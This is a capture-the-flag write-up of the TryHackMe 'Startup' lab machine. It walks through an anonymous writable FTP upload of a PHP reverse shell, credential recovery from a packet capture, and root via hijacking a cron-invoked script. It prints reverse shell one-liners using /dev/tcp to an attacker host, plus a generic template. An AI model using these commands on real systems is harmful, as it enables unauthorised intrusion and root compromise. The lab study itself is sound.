# Startup - TryHackMe

> **Kill Chain Summary**:
> Network Port Scanning (Ports 21, 22, 80) -> Anonymous FTP Authentication -> Writable FTP Directory Overlapping with Web Server Root (`/files/ftp/`) -> Uploading PHP Reverse Shell -> Remote Execution via HTTP -> Foothold as `www-data` -> Filesystem Investigation (`/incidents/suspicious.pcapng`) -> Wireshark TCP Stream Reconstruction -> Cleartext Credential Extraction (`c4ntg3t3n0ughsp1c3`) -> Lateral Movement to `lennie` -> Cron Job Audit (`planner.sh` executing `/etc/print.sh`) -> Script Hijacking on Writable Script -> Elevated Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Startup |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 16.04) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Anonymous Writable FTP, Web Root Overlap, PCAP Packet Analysis (Wireshark), Credential Recovery, Cron Script Hijacking |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.140.30 10.10.140.30
```

**Open Ports:**
- **Port 21:** FTP (vsftpd 3.0.3) - Anonymous login allowed with a writable `ftp/` directory.
- **Port 22:** OpenSSH 7.2p2 (Ubuntu Linux)
- **Port 80:** Apache httpd 2.4.18 (Ubuntu)

### 1.2 Web Directory Enumeration

Fuzzing directories with Gobuster on port 80:

```bash
gobuster dir -u http://10.10.140.30/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/files               (Status: 301) [--> http://10.10.140.30/files/]
```

Navigating to `http://10.10.140.30/files/` displays directory listings identical to the root of the FTP server.

> [!NOTE] Concept: Shared Web and FTP Document Root
> The FTP home directory is mapped directly into Apache's web root (`/var/www/html/files/`). Because anonymous users hold write permissions in the `ftp/` subdirectory, uploading an executable script over FTP enables direct execution through HTTP.

---

## 2. Initial Access

### 2.1 File Upload via Anonymous FTP

Authenticate to the FTP server using anonymous credentials:

```bash
ftp 10.10.140.30
```

```text
Name (10.10.140.30:vagrant): anonymous
Password: 
230 Login successful.
ftp> cd ftp
250 Directory successfully changed.
ftp> put reverse.php
226 Transfer complete.
```

### 2.2 Triggering Reverse Shell

Start a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

Request the uploaded PHP reverse shell:

```bash
curl http://10.10.140.30/files/ftp/reverse.php
```

The listener catches the reverse shell:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.140.30] 48214
www-data@startup:/$ whoami
www-data
```

---

## 3. Privilege Escalation

### 3.1 Network Packet Capture Discovery

Enumerating unusual directories at the filesystem root:

```bash
ls -la /incidents
```

```text
-rw-r--r-- 1 root root 31229 Nov 12  2020 suspicious.pcapng
```

The directory contains a packet capture file: `suspicious.pcapng`.

Copy the file into the public web directory for download:

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/suspicious.pcapng
```

Download the capture file onto the Kali machine:

```bash
wget http://10.10.140.30/files/ftp/suspicious.pcapng
```

### 3.2 Wireshark Packet Analysis

Open `suspicious.pcapng` in Wireshark:

```bash
wireshark suspicious.pcapng
```

1. Filter by TCP packets (`tcp`).
2. Right-click on a stream packet and select **Follow -> TCP Stream**.
3. Inspecting the terminal session stream reveals an administrative user running `su lennie` and accidentally typing the password into the prompt:

```text
lennie@startup:~$ su
Password: c4ntg3t3n0ughsp1c3
```

Discovered credentials:
- **Username:** `lennie`
- **Password:** `c4ntg3t3n0ughsp1c3`

### 3.3 Switching User Context

Authenticate as `lennie` within the active shell:

```bash
su lennie
```

Supply password `c4ntg3t3n0ughsp1c3` when prompted:

```bash
lennie@startup:/$ id
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
```

Retrieve the user flag:

```bash
cat /home/lennie/user.txt
```

```text
[FLAG REDACTED]
```

---

### Privilege Escalation

### 4.1 Cron Job Enumeration

Inspecting scripts located in `/home/lennie/scripts/`:

```bash
ls -la /home/lennie/scripts
cat /home/lennie/scripts/planner.sh
```

```bash
#!/bin/bash
# Do not remove the line below
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The script `planner.sh` is owned by `root` and executes periodically as a root cron job. It directly invokes `/etc/print.sh`.

Checking file permissions on `/etc/print.sh`:

```bash
ls -la /etc/print.sh
```

```text
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

`/etc/print.sh` is owned by user `lennie` with full read, write, and execute permissions.

### 4.2 Exploitation: Script Hijacking

> [!NOTE] Concept: Script Hijacking via Child Script Ownership
> When a root scheduled task executes a secondary script or binary owned by an unprivileged user, modifying the child script causes the scheduled root process to execute arbitrary commands with full administrative authority.

Overwrite `/etc/print.sh` with a reverse shell payload:

```bash
echo "sh -i >& /dev/tcp/10.10.14.5/5555 0>&1" > /etc/print.sh
chmod +x /etc/print.sh
```

Start a Netcat listener on port 5555:

```bash
nc -lvnp 5555
```

Within 60 seconds, the cron job triggers `planner.sh`, which executes `/etc/print.sh` as `root`:

```text
listening on [any] 5555 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.140.30] 52402
# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Upload via Command-Line FTP
ftp <TARGET_IP>
Name: anonymous
cd ftp
put <FILE>

# Wireshark Command-Line String Search (tshark)
tshark -r capture.pcapng -Y "data" -T fields -e data.data | xxd -r -p

# Hijack Scheduled Child Script
echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" > /path/to/child_script.sh
```

---

## 5. Key Takeaways and Lessons Learned

1. **Protocol Intersection:** When FTP and HTTP services are hosted on the same target, verify whether writable FTP subdirectories map into the web server document root.
2. **Artifact Exfiltration Safety:** When exfiltrating network captures or log files, always make a copy (`cp`) rather than moving (`mv`) the original file to avoid altering evidence or breaking background system services.
3. **Child Script Permissions:** Audit all dependencies invoked by cron jobs. Even if a master cron script is owned by `root` and read-only, any referenced external scripts owned by lower-privileged users represent immediate root compromise.

---

#tryhackme #linux #easy #ftp #anonymous #writable-ftp #pcap #wireshark #credential-recovery #script-hijacking #cron #privesc